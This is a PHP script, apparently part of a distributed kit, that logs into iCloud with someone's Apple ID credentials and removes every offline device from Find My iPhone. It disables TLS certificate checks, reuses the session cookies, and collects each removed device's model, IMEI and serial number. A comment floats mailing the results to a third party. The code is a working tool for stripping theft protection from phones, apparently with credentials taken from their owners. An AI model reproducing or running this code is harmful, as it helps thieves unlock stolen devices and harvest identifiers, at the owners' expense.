<?php
//Dont change any thing in this file :Dyes api YOU CAN CHANGE THE name here
class Devjo {

private $headers = array(
'Origin: https://www.icloud.com ',
'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36 ',
'Content-Type: text/plain ',
'Accept: */*',
'Referer: https://www.icloud.com/ ',
'Accept-Encoding: gzip, deflate ',
'Accept-Language: en-US,en;q=0.8 ',
);
private $username;
private $password;
private $server;
private $devices_list= array();
public function Login($user , $pass){
	$this->username = $user;
	$this->password = $pass;
	$url = "https://setup.icloud.com/setup/ws/1/login";
	$data = '{"apple_id":"'.$this->username.'","password":"'.$this->password.'","extended_login":false}';
	
	$response = $this->Post($url,$data);
	$result = $response[0];
	$result_with_headers = $response[1];
	
	$first = json_decode($result, true);

if(isset($first["error"])){
return false;	
}else{
	$this->server = $first["webservices"]["findme"]["url"];
//Geth the cookies
preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result_with_headers, $matches);
$cookies = "";
foreach($matches[0] as $value){
	$value = str_replace("Set-Cookie: ","",$value);
$cookies .= $value."; ";
}
//Get list
$this->headers[6] = "Cookie: ".$cookies;
	//$this->devices_list[0] = $this->username ." : ". $this->password ;
return true;
}
}
public function Delete_All(){

	$this->Login($this->username,$this->password);
	$url = $this->server."/fmipservice/client/web/refreshClient";
	$response = $this->Post($url,"");
	$result = $response[0];
	$result = json_decode($result);
$devices = $result->content;
$serverContext = json_encode($result->serverContext);
$details = $this->GetDetails();
foreach($devices as $device){
if($device->deviceStatus ==201){
		
	$id = $device->id;
	$name = $device->name;
	foreach($details as $single){
		if($name == $single->name){
			$device_name = $single->modelDisplayName;
			$this->devices_list[] = $device_name." : [".$single->imei ."]+[".$single->serialNumber ."]";
		}
	}
	$url = $this->server."/fmipservice/client/web/remove";
	$data = '{"device":"'.$id.'","serverContext":'.$serverContext.',"clientContext":{"appName":"iCloud Find (Web)","appVersion":"2.0","timezone":"US/Pacific","inactiveTime":97,"apiVersion":"3.0","fmly":true}}';
	$response = $this->Post($url,$data);
//HERE we can add MAIL("tahmrs","$id is removed") but it will not show you the imei youes only email?
	}
}
return $this->devices_list;
}
public function GetDetails(){
	$url = "https://p38-setup.icloud.com/setup/web/device/getDevices?";
	$response = $this->Post($url,"");
	$response = json_decode($response[0]);
	return $response->devices;
}


public function Post($url,$data){
	$ch = curl_init($url);
curl_setopt($ch ,CURLOPT_POST,true);
//curl_setopt($ch, CURLOPT_PROXY, '127.0.0.1:8080');
curl_setopt($ch ,CURLOPT_HTTP_VERSION,CURL_HTTP_VERSION_1_1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_ENCODING, 'UTF-8');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_VERBOSE, true);
$result = curl_exec($ch);
curl_setopt($ch, CURLOPT_HEADER, true);
$result_with_headers = curl_exec($ch);
return array($result,$result_with_headers);
}

}
?>